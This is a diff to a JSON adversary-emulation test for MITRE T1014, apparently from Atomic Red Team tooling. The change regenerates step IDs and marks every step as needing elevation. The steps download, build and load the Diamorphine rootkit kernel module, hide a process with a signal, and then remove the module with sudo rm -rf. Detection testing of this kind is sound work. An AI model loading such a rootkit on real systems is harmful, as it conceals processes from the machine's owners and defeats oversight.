@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "c781e4f0-e3c0-4b0e-b6e5-63557d3160d3",
+      "id": "1c977da0-ec2c-4625-9ad3-c86c035b2826",
       "type": "execute-command",
       "data": {
         "command": "sudo modprobe #{rootkit_name}\nping -c 10 localhost \u003e/dev/null \u0026 TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n",
         "command_type": "sh"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "098fabe4-03fa-4fd8-b2ae-a7d281c1be3c",
+      "id": "802e1b1c-d965-4994-a1bb-df2149adef83",
       "type": "execute-command",
       "data": {
         "command": "kill -63 1\nsudo modprobe -r #{rootkit_name}\nsudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic\nsudo depmod -a\n",
         "command_type": "sh"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "efb6b482-d4bb-41f0-98cc-52dab6333c9c",
+      "id": "2bf85ab6-672a-44fe-888c-f47e47813ce8",
       "name": "Check dependency 1/1",
       "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "8bb78ba4-db48-4abc-b72d-5c06215a9b7e",
+      "id": "f642c9fa-14b9-4e34-8f1d-6238b022d0a7",
       "name": "Resolve dependency 1/1",
       "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "mkdir -p /tmp/atomic \u0026\u0026 cd /tmp/atomic\ncurl -sLO #{repo}/archive/#{rev}.zip \u0026\u0026 unzip #{rev}.zip \u0026\u0026 cd Diamorphine-#{rev}\nmake\nsudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/\nsudo depmod -a\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "d67251df-493e-4b98-9437-9520e00e991d",
+      "id": "dfe853b5-6cc2-4845-aaad-08dee5d5b70e",
       "name": "Re-check dependency 1/1",
       "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
       "type": "execute-command",
@@ -55,44 +55,43 @@
         "command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "c781e4f0-e3c0-4b0e-b6e5-63557d3160d3",
+      "s": "1c977da0-ec2c-4625-9ad3-c86c035b2826",
       "p": "on-success",
-      "o": "098fabe4-03fa-4fd8-b2ae-a7d281c1be3c"
+      "o": "802e1b1c-d965-4994-a1bb-df2149adef83"
     },
     {
-      "s": "c781e4f0-e3c0-4b0e-b6e5-63557d3160d3",
+      "s": "1c977da0-ec2c-4625-9ad3-c86c035b2826",
       "p": "on-failure",
-      "o": "098fabe4-03fa-4fd8-b2ae-a7d281c1be3c"
+      "o": "802e1b1c-d965-4994-a1bb-df2149adef83"
     },
     {
-      "s": "efb6b482-d4bb-41f0-98cc-52dab6333c9c",
+      "s": "2bf85ab6-672a-44fe-888c-f47e47813ce8",
       "p": "on-success",
-      "o": "c781e4f0-e3c0-4b0e-b6e5-63557d3160d3"
+      "o": "1c977da0-ec2c-4625-9ad3-c86c035b2826"
     },
     {
-      "s": "efb6b482-d4bb-41f0-98cc-52dab6333c9c",
+      "s": "2bf85ab6-672a-44fe-888c-f47e47813ce8",
       "p": "on-failure",
-      "o": "8bb78ba4-db48-4abc-b72d-5c06215a9b7e"
+      "o": "f642c9fa-14b9-4e34-8f1d-6238b022d0a7"
     },
     {
-      "s": "8bb78ba4-db48-4abc-b72d-5c06215a9b7e",
+      "s": "f642c9fa-14b9-4e34-8f1d-6238b022d0a7",
       "p": "on-success",
-      "o": "d67251df-493e-4b98-9437-9520e00e991d"
+      "o": "dfe853b5-6cc2-4845-aaad-08dee5d5b70e"
     },
     {
-      "s": "d67251df-493e-4b98-9437-9520e00e991d",
+      "s": "dfe853b5-6cc2-4845-aaad-08dee5d5b70e",
       "p": "on-failure",
-      "o": "c781e4f0-e3c0-4b0e-b6e5-63557d3160d3"
+      "o": "1c977da0-ec2c-4625-9ad3-c86c035b2826"
     }
   ],
   "tags": [
-    "T1014",
-    "atomic-red-team"
+    "T1014"
   ],
   "input_arguments": [
     {
